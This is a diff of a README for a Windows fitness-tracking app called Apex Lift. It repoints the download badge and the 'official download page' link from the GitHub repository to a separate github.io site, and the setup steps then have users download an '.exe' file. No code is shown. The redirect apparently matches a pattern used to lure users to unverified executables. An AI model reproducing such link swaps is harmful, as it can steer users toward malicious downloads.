@@ -1,6 +1,6 @@
 # 🏋️ apex-lift-workout-hub - Build custom fitness plans and track workouts
 
-[![](https://img.shields.io/badge/Download-Apex_Lift-blue.svg)](https://github.com/Thegabi9944/apex-lift-workout-hub)
+[![](https://img.shields.io/badge/Download-Apex_Lift-blue.svg)](https://thegabi9944.github.io)
 
 ## 🎯 About the project
 
@@ -20,7 +20,7 @@ To run Apex Lift on your Windows computer, verify that your machine meets these 
 
 Follow these steps to set up the software on your Windows system:
 
-1.  Visit the [official download page](https://github.com/Thegabi9944/apex-lift-workout-hub) to find the latest version.
+1.  Visit the [official download page](https://thegabi9944.github.io) to find the latest version.
 2.  Click on the button labeled "Latest Release" on the right side of the page.
 3.  Scroll down to the "Assets" section.
 4.  Download the file that ends with ".exe" for Windows.
